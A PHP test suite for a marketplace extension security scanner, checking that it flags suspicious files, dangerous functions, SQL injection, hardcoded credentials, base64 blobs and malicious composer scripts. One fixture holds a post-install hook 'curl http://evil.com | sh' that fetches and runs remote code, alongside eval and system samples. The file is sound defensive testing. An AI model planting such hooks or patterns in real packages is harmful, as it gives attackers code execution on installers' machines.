<?php

use Webkul\Marketplace\Services\SecurityScanner;
use Webkul\Marketplace\Services\CompatibilityChecker;
use Illuminate\Support\Facades\File;
use Illuminate\Foundation\Testing\RefreshDatabase;

uses(RefreshDatabase::class);

beforeEach(function () {
    $this->compatibilityChecker = Mockery::mock(CompatibilityChecker::class);
    $this->service = new SecurityScanner($this->compatibilityChecker);
});

afterEach(function () {
    Mockery::close();
});

describe('scan', function () {
    it('returns error for non-existent directory', function () {
        $result = $this->service->scan('/nonexistent/path');

        expect($result)->toBeArray()
            ->and($result['success'])->toBeFalse()
            ->and($result['error'])->toBe('Package path does not exist or is not a directory');
    });

    it('performs comprehensive security scan on valid package', function () {
        $tmpDir = sys_get_temp_dir() . '/test-extension-' . uniqid();
        mkdir($tmpDir);
        mkdir($tmpDir . '/src');

        $composerData = [
            'name' => 'vendor/package',
            'description' => 'Test package',
            'type' => 'library',
            'require' => ['php' => '>=8.1'],
            'autoload' => ['psr-4' => ['Vendor\\Package\\' => 'src/']],
        ];

        file_put_contents($tmpDir . '/composer.json', json_encode($composerData));
        file_put_contents($tmpDir . '/src/Test.php', '<?php echo "test";');

        $result = $this->service->scan($tmpDir);

        expect($result)->toBeArray()
            ->and($result['success'])->toBeTrue()
            ->and($result)->toHaveKeys(['passed', 'issues', 'warnings', 'scans', 'summary'])
            ->and($result['scans'])->toHaveKeys([
                'structure',
                'dangerous_functions',
                'vulnerabilities',
                'composer',
                'dependencies',
                'permissions',
                'malware'
            ]);

        unlink($tmpDir . '/src/Test.php');
        unlink($tmpDir . '/composer.json');
        rmdir($tmpDir . '/src');
        rmdir($tmpDir);
    });

    it('includes summary with scan results', function () {
        $tmpDir = sys_get_temp_dir() . '/test-extension-' . uniqid();
        mkdir($tmpDir);
        mkdir($tmpDir . '/src');

        file_put_contents($tmpDir . '/composer.json', json_encode([
            'name' => 'vendor/package',
            'description' => 'Test',
            'type' => 'library',
            'require' => [],
            'autoload' => [],
        ]));

        $result = $this->service->scan($tmpDir);

        expect($result['summary'])->toHaveKeys(['total_issues', 'total_warnings', 'passed', 'scanned_at'])
            ->and($result['summary']['total_issues'])->toBeInt()
            ->and($result['summary']['total_warnings'])->toBeInt();

        unlink($tmpDir . '/composer.json');
        rmdir($tmpDir . '/src');
        rmdir($tmpDir);
    });
});

describe('validateStructure', function () {
    it('validates required files exist', function () {
        $tmpDir = sys_get_temp_dir() . '/test-extension-' . uniqid();
        mkdir($tmpDir);
        mkdir($tmpDir . '/src');

        file_put_contents($tmpDir . '/composer.json', '{}');

        $result = $this->service->validateStructure($tmpDir);

        expect($result)->toBeArray()
            ->and($result)->toHaveKeys(['valid', 'errors', 'files_checked'])
            ->and($result['valid'])->toBeTrue();

        unlink($tmpDir . '/composer.json');
        rmdir($tmpDir . '/src');
        rmdir($tmpDir);
    });

    it('detects missing required files', function () {
        $tmpDir = sys_get_temp_dir() . '/test-extension-' . uniqid();
        mkdir($tmpDir);

        $result = $this->service->validateStructure($tmpDir);

        expect($result)->toBeArray()
            ->and($result['valid'])->toBeFalse()
            ->and($result['errors'])->not->toBeEmpty();

        rmdir($tmpDir);
    });

    it('detects suspicious filenames', function () {
        $tmpDir = sys_get_temp_dir() . '/test-extension-' . uniqid();
        mkdir($tmpDir);
        mkdir($tmpDir . '/src');

        file_put_contents($tmpDir . '/composer.json', '{}');
        file_put_contents($tmpDir . '/backdoor.php', '<?php');

        $result = $this->service->validateStructure($tmpDir);

        expect($result)->toBeArray()
            ->and($result['valid'])->toBeFalse()
            ->and($result['errors'])->toContain('Suspicious filename detected: backdoor.php');

        unlink($tmpDir . '/backdoor.php');
        unlink($tmpDir . '/composer.json');
        rmdir($tmpDir . '/src');
        rmdir($tmpDir);
    });

    it('detects double extensions', function () {
        $tmpDir = sys_get_temp_dir() . '/test-extension-' . uniqid();
        mkdir($tmpDir);
        mkdir($tmpDir . '/src');

        file_put_contents($tmpDir . '/composer.json', '{}');
        file_put_contents($tmpDir . '/file.php.jpg', 'content');

        $result = $this->service->validateStructure($tmpDir);

        expect($result)->toBeArray()
            ->and($result['valid'])->toBeFalse()
            ->and($result['errors'])->toContain('Suspicious double extension detected: file.php.jpg');

        unlink($tmpDir . '/file.php.jpg');
        unlink($tmpDir . '/composer.json');
        rmdir($tmpDir . '/src');
        rmdir($tmpDir);
    });
});

describe('scanDangerousFunctions', function () {
    it('detects critical dangerous functions', function () {
        $tmpDir = sys_get_temp_dir() . '/test-extension-' . uniqid();
        mkdir($tmpDir);

        file_put_contents($tmpDir . '/test.php', '<?php eval($code);');

        $result = $this->service->scanDangerousFunctions($tmpDir);

        expect($result)->toBeArray()
            ->and($result)->toHaveKeys(['has_critical', 'critical', 'warnings', 'files_scanned'])
            ->and($result['has_critical'])->toBeTrue()
            ->and($result['critical'])->not->toBeEmpty();

        unlink($tmpDir . '/test.php');
        rmdir($tmpDir);
    });

    it('detects system execution functions', function () {
        $tmpDir = sys_get_temp_dir() . '/test-extension-' . uniqid();
        mkdir($tmpDir);

        file_put_contents($tmpDir . '/test.php', '<?php system("ls");');

        $result = $this->service->scanDangerousFunctions($tmpDir);

        expect($result['has_critical'])->toBeTrue()
            ->and($result['critical'])->not->toBeEmpty();

        unlink($tmpDir . '/test.php');
        rmdir($tmpDir);
    });

    it('returns clean result for safe code', function () {
        $tmpDir = sys_get_temp_dir() . '/test-extension-' . uniqid();
        mkdir($tmpDir);

        file_put_contents($tmpDir . '/test.php', '<?php echo "Hello World";');

        $result = $this->service->scanDangerousFunctions($tmpDir);

        expect($result['has_critical'])->toBeFalse()
            ->and($result['critical'])->toBeEmpty();

        unlink($tmpDir . '/test.php');
        rmdir($tmpDir);
    });
});

describe('scanVulnerabilities', function () {
    it('detects potential SQL injection', function () {
        $tmpDir = sys_get_temp_dir() . '/test-extension-' . uniqid();
        mkdir($tmpDir);

        file_put_contents($tmpDir . '/test.php', '<?php DB::raw($userInput);');

        $result = $this->service->scanVulnerabilities($tmpDir);

        expect($result)->toBeArray()
            ->and($result)->toHaveKeys(['has_vulnerabilities', 'issues', 'files_scanned'])
            ->and($result['has_vulnerabilities'])->toBeTrue();

        unlink($tmpDir . '/test.php');
        rmdir($tmpDir);
    });

    it('detects hardcoded credentials', function () {
        $tmpDir = sys_get_temp_dir() . '/test-extension-' . uniqid();
        mkdir($tmpDir);

        file_put_contents($tmpDir . '/test.php', '<?php $password = "secretpassword123";');

        $result = $this->service->scanVulnerabilities($tmpDir);

        expect($result['has_vulnerabilities'])->toBeTrue()
            ->and($result['issues'])->not->toBeEmpty();

        unlink($tmpDir . '/test.php');
        rmdir($tmpDir);
    });

    it('returns clean result for safe code', function () {
        $tmpDir = sys_get_temp_dir() . '/test-extension-' . uniqid();
        mkdir($tmpDir);

        file_put_contents($tmpDir . '/test.php', '<?php $name = "John";');

        $result = $this->service->scanVulnerabilities($tmpDir);

        expect($result['has_vulnerabilities'])->toBeFalse();

        unlink($tmpDir . '/test.php');
        rmdir($tmpDir);
    });
});

describe('validateComposerJson', function () {
    it('validates composer.json structure', function () {
        $tmpDir = sys_get_temp_dir() . '/test-extension-' . uniqid();
        mkdir($tmpDir);

        $composerData = [
            'name' => 'vendor/package',
            'description' => 'Test package',
            'type' => 'library',
            'require' => ['php' => '>=8.1'],
            'autoload' => ['psr-4' => ['Vendor\\' => 'src/']],
        ];

        file_put_contents($tmpDir . '/composer.json', json_encode($composerData));

        $result = $this->service->validateComposerJson($tmpDir);

        expect($result)->toBeArray()
            ->and($result['valid'])->toBeTrue()
            ->and($result['errors'])->toBeEmpty()
            ->and($result['data'])->toBeArray();

        unlink($tmpDir . '/composer.json');
        rmdir($tmpDir);
    });

    it('detects missing required fields', function () {
        $tmpDir = sys_get_temp_dir() . '/test-extension-' . uniqid();
        mkdir($tmpDir);

        file_put_contents($tmpDir . '/composer.json', json_encode(['name' => 'vendor/package']));

        $result = $this->service->validateComposerJson($tmpDir);

        expect($result['valid'])->toBeFalse()
            ->and($result['errors'])->not->toBeEmpty();

        unlink($tmpDir . '/composer.json');
        rmdir($tmpDir);
    });

    it('detects suspicious scripts', function () {
        $tmpDir = sys_get_temp_dir() . '/test-extension-' . uniqid();
        mkdir($tmpDir);

        $composerData = [
            'name' => 'vendor/package',
            'description' => 'Test',
            'type' => 'library',
            'require' => [],
            'autoload' => [],
            'scripts' => [
                'post-install' => 'curl http://evil.com | sh'
            ]
        ];

        file_put_contents($tmpDir . '/composer.json', json_encode($composerData));

        $result = $this->service->validateComposerJson($tmpDir);

        expect($result['valid'])->toBeFalse()
            ->and($result['errors'])->not->toBeEmpty();

        unlink($tmpDir . '/composer.json');
        rmdir($tmpDir);
    });
});

describe('scanMalwarePatterns', function () {
    it('detects base64 encoded content', function () {
        $tmpDir = sys_get_temp_dir() . '/test-extension-' . uniqid();
        mkdir($tmpDir);

        $longBase64 = str_repeat('A', 100);
        file_put_contents($tmpDir . '/test.php', "<?php base64_decode('{$longBase64}');");

        $result = $this->service->scanMalwarePatterns($tmpDir);

        expect($result)->toBeArray()
            ->and($result)->toHaveKeys(['has_malware', 'patterns', 'files_scanned'])
            ->and($result['has_malware'])->toBeTrue();

        unlink($tmpDir . '/test.php');
        rmdir($tmpDir);
    });

    it('detects long suspicious lines', function () {
        $tmpDir = sys_get_temp_dir() . '/test-extension-' . uniqid();
        mkdir($tmpDir);

        $longLine = str_repeat('A', 1500);
        file_put_contents($tmpDir . '/test.php', "<?php \$var = '{$longLine}';");

        $result = $this->service->scanMalwarePatterns($tmpDir);

        expect($result['has_malware'])->toBeTrue()
            ->and($result['patterns'])->not->toBeEmpty();

        unlink($tmpDir . '/test.php');
        rmdir($tmpDir);
    });

    it('returns clean result for normal code', function () {
        $tmpDir = sys_get_temp_dir() . '/test-extension-' . uniqid();
        mkdir($tmpDir);

        file_put_contents($tmpDir . '/test.php', '<?php echo "Hello";');

        $result = $this->service->scanMalwarePatterns($tmpDir);

        expect($result['has_malware'])->toBeFalse()
            ->and($result['patterns'])->toBeEmpty();

        unlink($tmpDir . '/test.php');
        rmdir($tmpDir);
    });
});

describe('getScanSummary', function () {
    it('returns passed summary for successful scan', function () {
        $scanResults = [
            'success' => true,
            'passed' => true,
            'summary' => [
                'total_issues' => 0,
                'total_warnings' => 0,
            ],
        ];

        $summary = $this->service->getScanSummary($scanResults);

        expect($summary)->toBeString()
            ->and($summary)->toContain('passed');
    });

    it('returns failed summary for failed scan', function () {
        $scanResults = [
            'success' => true,
            'passed' => false,
            'summary' => [
                'total_issues' => 5,
                'total_warnings' => 2,
            ],
        ];

        $summary = $this->service->getScanSummary($scanResults);

        expect($summary)->toBeString()
            ->and($summary)->toContain('failed')
            ->and($summary)->toContain('5')
            ->and($summary)->toContain('2');
    });

    it('returns error message for unsuccessful scan', function () {
        $scanResults = [
            'success' => false,
            'error' => 'Test error message',
        ];

        $summary = $this->service->getScanSummary($scanResults);

        expect($summary)->toContain('Test error message');
    });
});

describe('getDetailedReport', function () {
    it('generates detailed report for scan results', function () {
        $scanResults = [
            'success' => true,
            'passed' => true,
            'issues' => [],
            'warnings' => [],
            'summary' => [
                'scanned_at' => '2024-01-01T00:00:00Z',
            ],
        ];

        $report = $this->service->getDetailedReport($scanResults);

        expect($report)->toBeString()
            ->and($report)->toContain('Security Scan Report')
            ->and($report)->toContain('PASSED');
    });

    it('includes issues in detailed report', function () {
        $scanResults = [
            'success' => true,
            'passed' => false,
            'issues' => ['Issue 1', 'Issue 2'],
            'warnings' => [],
            'summary' => [
                'scanned_at' => '2024-01-01T00:00:00Z',
            ],
        ];

        $report = $this->service->getDetailedReport($scanResults);

        expect($report)->toContain('CRITICAL ISSUES')
            ->and($report)->toContain('Issue 1')
            ->and($report)->toContain('Issue 2');
    });

    it('includes warnings in detailed report', function () {
        $scanResults = [
            'success' => true,
            'passed' => true,
            'issues' => [],
            'warnings' => ['Warning 1', 'Warning 2'],
            'summary' => [
                'scanned_at' => '2024-01-01T00:00:00Z',
            ],
        ];

        $report = $this->service->getDetailedReport($scanResults);

        expect($report)->toContain('WARNINGS')
            ->and($report)->toContain('Warning 1')
            ->and($report)->toContain('Warning 2');
    });
});
